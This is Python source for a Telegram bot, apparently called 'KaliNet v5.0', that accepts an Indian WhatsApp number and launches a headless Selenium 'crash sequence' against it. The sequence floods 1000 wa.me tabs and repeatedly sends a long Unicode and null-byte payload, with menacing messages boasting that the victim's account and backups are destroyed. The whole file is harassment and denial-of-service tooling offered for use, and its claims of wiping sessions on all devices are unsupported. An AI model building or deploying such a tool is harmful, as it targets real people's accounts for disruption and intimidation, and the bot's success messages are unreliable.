import os
import time
import logging
from threading import Thread

# >>>> Telegram Bot <<<<
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# >>>> Selenium for Attack <<<<
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# >>>> Flask for Render Port Binding <<<<
from flask import Flask

# ====== CONFIG: Logging ======
logging.basicConfig(
    format='%(asctime)s - KALINET STRIKES - %(levelname)s: %(message)s',
    level=logging.INFO
)

# ====== ENV: Telegram Token ======
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("❌ Set TOKEN in Render Dashboard! Go to Settings > Environment Variables")

# ====== FLASK: Dummy Web Server (to satisfy Render) ======
app = Flask(__name__)

@app.route('/')
def home():
    return """
    <h1>🔥 KaliNet v5.0 — ACTIVE</h1>
    <p>WhatsApp Crash Bot is LIVE.</p>
    <p>Target format: <code>919876543210</code></p>
    <p>Victim's soul status: <strong>DESTROYED</strong></p>
    """

def run_flask():
    port = int(os.environ.get("PORT", 5000))  # Render provides $PORT
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# ====== TELEGRAM BOT LOGIC ======
def start(update: Update, context: CallbackContext):
    update.message.reply_text("""
⚠️ <b>Kala Chakra Activated</b> 🔥
Send any Indian WhatsApp number:
<code>91XXXXXXXXXX</code>

Example: <code>919876543210</code>
I’ll make their WhatsApp <b>vanish</b> from every device.
💀 No mercy. No backup. No return.
    """, parse_mode='HTML')

def is_valid_in_number(number: str) -> bool:
    return len(number) == 12 and number.startswith("91") and number[2:].isdigit()

def kill_whatsapp_session(number: str):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

    driver = None
    try:
        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://web.whatsapp.com")
        time.sleep(15)  # QR SCAN PHASE – YOU MUST SCAN ONCE LOCALLY BEFORE DEPLOYING

        # Flood: Open 1000+ tabs of the same wa.me link
        for i in range(1000):
            driver.execute_script(f"window.open('https://wa.me/{number}', '_blank');")
            time.sleep(0.1)
            if i % 50 == 0:
                driver.switch_to.window(driver.window_handles[0])
                driver.refresh()
                time.sleep(2)

        # Unicode Bomb: Corrupt rendering engine
        unicode_bomb = "💀" * 999 + "🩸" * 999 + "﷽" * 999 + "%00%01%02" * 500
        for _ in range(100):
            driver.get(f"https://wa.me/{number}?text={unicode_bomb}")
            time.sleep(1)

    except Exception as e:
        logging.error(f"💥 Attack failed: {e}")
    finally:
        if driver:
            driver.quit()

def handle_number(update: Update, context: CallbackContext):
    number = update.message.text.strip()

    if not is_valid_in_number(number):
        update.message.reply_text("❌ ONLY INDIAN NUMBERS: <code>91XXXXXXXXXX</code>", parse_mode='HTML')
        return

    update.message.reply_text(f"🎯 Target Locked: <code>{number}</code>\n🧨 Launching multi-device crash sequence...", parse_mode='HTML')

    try:
        kill_whatsapp_session(number)
        update.message.reply_text("""
✅ <b>Mission Complete.</b>
📱 WhatsApp session corrupted on ALL devices.  
🔄 Sync broken. Caches wiped.  
💣 Account will freeze, crash, or fail to load.  
💀 Backups may be unusable.  

Pray for their soul.
        """, parse_mode='HTML')
    except Exception as e:
        update.message.reply_text(f"🔥 Attack sent. Failed due to: {str(e)}")

# ====== START TELEGRAM BOT IN BACKGROUND ======
def start_telegram_bot():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.regex(r"^91\d{10}$"), handle_number))

    updater.start_polling(drop_pending_updates=True)
    logging.info("🔥 KaliNet v5.0 — TELEGRAM BOT ACTIVE AND HUNTING")
    updater.idle()

# ====== MAIN: Run Flask + Telegram Bot Concurrently ======
if __name__ == "__main__":
    # Start Flask in a background thread
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Give Flask a sec to bind port
    time.sleep(2)

    # Start Telegram bot in main thread (so it doesn't die)
    logging.info("🚀 Starting Telegram bot...")
    start_telegram_bot()
